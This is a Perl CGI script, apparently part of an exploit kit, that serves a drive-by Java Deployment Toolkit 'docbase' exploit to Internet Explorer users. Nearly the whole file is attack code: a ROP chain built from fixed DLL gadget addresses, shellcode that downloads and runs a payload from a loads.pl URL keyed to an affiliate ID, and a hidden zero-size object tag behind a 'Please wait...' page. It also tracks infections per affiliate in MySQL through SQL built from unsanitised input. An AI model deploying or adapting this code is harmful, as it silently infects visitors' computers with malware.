#!/usr/bin/perl

#
# Java Docbase exploit
# TESTED on ie 6/7/8 java 1.6.0_20 - 1.6.0_21 (WORKING)
#

use CGI;
use DBI;
require "../lib/Shellcode.pm";
require "../config.pl";

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

#Insert the view param on exploit (admin)
$sql = "UPDATE exploits SET javadocbase=javadocbase+1 WHERE affid='admin'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

$q = new CGI;

$aff = $q->param('aff');
$os_flav = $q->param('flavor');

#Insert the view param on exploit
$sql = "UPDATE exploits SET javadocbase=javadocbase+1 WHERE affid='$aff'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

#Exploitation vars
$urlllll = $config{UrlToFolder} . '/loads.pl?aff=' . $aff . '&xplload=javadocbase';
if($os_flav eq '7')
{
  $shellcode = Shellcode::pdfgetshell2($urlllll);
}
else
{
  $shellcode = Shellcode::pdfgetshell4($urlllll);
}

#constances
$baseaddress = 0x7c340000;
$single_op = "\x90\x51\x5F\xC3";
$single_op = "\xC3\x5F\x51\x90";
$single_op = ascii_to_hex($single_op);


$scratch     = sprintf "%X", $baseaddress + 0x4b170; # Scratch space..
$scratch2    = sprintf "%X", $baseaddress + 0x4b160; # Scratch space..
$import_VA   = sprintf "%X", $baseaddress + 0x3a034; # The import address of HeapCreate (less 0x58; avoid badchars)
$add_58_eax  = sprintf "%X", $baseaddress + 0xd05e;  # add eax; 0x58 / ret
$pop_eax     = sprintf "%X", $baseaddress + 0x4cc1;  # pop eax / ret
$deref_eax   = sprintf "%X", $baseaddress + 0x130ea; # mov eax; [eax] / ret
$deref_eax4  = sprintf "%X", $baseaddress + 0xe72b;  # mov eax; [eax+4] / ret
$jmp_eax     = sprintf "%X", $baseaddress + 0x13ac;  # push eax / ret
$jmp_ecx     = sprintf "%X", $baseaddress + 0x6b0e;  # jmp ecx
$pop_edx     = sprintf "%X", $baseaddress + 0x5937;  # pop edx / ret
$adjust_eax  = sprintf "%X", $baseaddress + 0x32ef8; # add eax; 0x80bf / add dh; dh / ret
$rep_movsd   = sprintf "%X", $baseaddress + 0x363f;  # rep movsd / pop edi / pop esi / sub eax; eax / ret
$esp_to_esi  = sprintf "%X", $baseaddress + 0x32f4f; # push esp / and al; 0x10 / mov [edx]; ecx / pop esi / ret
$switcheroo  = sprintf "%X", $baseaddress + 0x3427;  # mov ecx; eax / mov eax; esi / pop esi / ret 0x10
$st_eax_ecx  = sprintf "%X", $baseaddress + 0x103c8; # mov [ecx]; eax / ret
$xor_ecx     = sprintf "%X", $baseaddress + 0x1aa5f; # xor ecx; ecx / mov [eax+0xc]; ecx / ret 4
$set_ecx_fd  = sprintf "%X", $baseaddress + 0x1690b; # mov cl; 0xfe / dec ecx / ret

$stack = 
$pop_eax .
randomchar() .     # unused space..
randomchar() .
randomchar() .
randomchar() .
$import_VA .    # becomes eax
$add_58_eax .
$deref_eax .

# call HeapCreate
$jmp_eax .
$adjust_eax .   # eip after HeapCreate
'01040110' .    # flOptions (gets & with 0x40005)
'01010101' .    # dwInitialSize
'01010101' .    # dwMaximumSize

# Move esp into esi
$pop_edx .
$scratch .      # becomes edx
$esp_to_esi .

# Store a single-dword stub to our buffer
$switcheroo . 
$single_op .  #becomes esi/eax
$deref_eax4 .
randomchar() .    # more unused space..
randomchar() .
randomchar() .
randomchar() .
$st_eax_ecx .

# Call our dword-stub
$jmp_ecx .

# Re-load ESP and save our Heap address to scratch (edx)
$esp_to_esi .

# Set ecx to something sane (for memcpy)
$pop_eax .
$scratch2 .
$xor_ecx .
$set_ecx_fd .
randomchar() .    # skipped by ret 0x4

# Do the memcpy!
$rep_movsd .
randomchar() .    # becomes edi
randomchar() .    # becomes esi

# Re-load our Heap pointer
$pop_eax .
$scratch .
$deref_eax .

# Adjust it to skip the non-payload parts
$add_58_eax .

# Execute it !
$jmp_eax .

# BOOO!
randomchar();

#Operations to the stack
$stackconverted = hex_to_ascii($stack);
$asciivar = convert_sco($stackconverted);
$stackconverted2 = hex_to_ascii($asciivar);

#create docbase document
$docbase .= generate_char(391);
$docbase .= $stackconverted2;
$lengthdocbase = length($docbase);
$randomtext2 = generate_char(583 - $lengthdocbase);
$docbase .= $randomtext2;
$docbase .= $shellcode;

#HTML DATA
my $datahtml = <<EOF;
<html>
<body>Please wait...
<object id="SgQeervdCJ" classid="clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA" width="0" height="0">
<PARAM name="launchjnlp" value="1">
<PARAM name="docbase" value="$docbase">
</object>
<embed type="application/x-java-applet" width="0" height="0" launchjnlp="1" docbase="$docbase" />
</body>
</html>
EOF


###### BEGIN PRINT EXPLOIT #########
print $q->header(-p3p => 'IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT');

print $datahtml;

####### END PRINT EXPLOIT ##########

sub hex_to_ascii ($)
{
	## Convert each two-digit hex number back to an ASCII character.
	(my $str = shift) =~ s/([a-fA-F0-9]{2})/chr(hex $1)/eg;
	return $str;
}

sub ascii_to_hex ($)
{
	## Convert each ASCII character to a two-digit hex number.
	(my $str = shift) =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
	return $str;
}

sub generate_char
{
 my $wdsize = shift;
 my @alphanumeric = ('a'..'f','1'..'9');
 my $wd = join '',
 map $alphanumeric[rand @alphanumeric], 0..$wdsize;
  return $wd;
}

sub convert_sco {
        my $data = shift;
        my $mode = shift() || 'LE';
        my $code = '';

        my $idx = 0;

        if (length($data) % 2 != 0) {
                $data .= substr($data, -1, 1);
        }

        while ($idx < length($data) - 1) {
                my $c1 = ord(substr($data, $idx, 1));
                my $c2 = ord(substr($data, $idx+1, 1));
                my $c3 = ord(substr($data, $idx+2, 1));
                my $c4 = ord(substr($data, $idx+3, 1));
                if ($mode eq 'LE') {
                        $code .= sprintf('%.2x%.2x%.2x%.2x', $c4, $c3, $c2, $c1);
                } else {
                        $code .= sprintf('%.2x%.2x', $c1, $c2);
                }
                $idx += 4;
        }

        return $code;
}

sub randomchar
{
  $multisize = 3;
  $rdmch = generate_char($multisize);
  $rdmch2 = ascii_to_hex($rdmch);
  return $rdmch2;
}

$dbh->disconnect();

1;
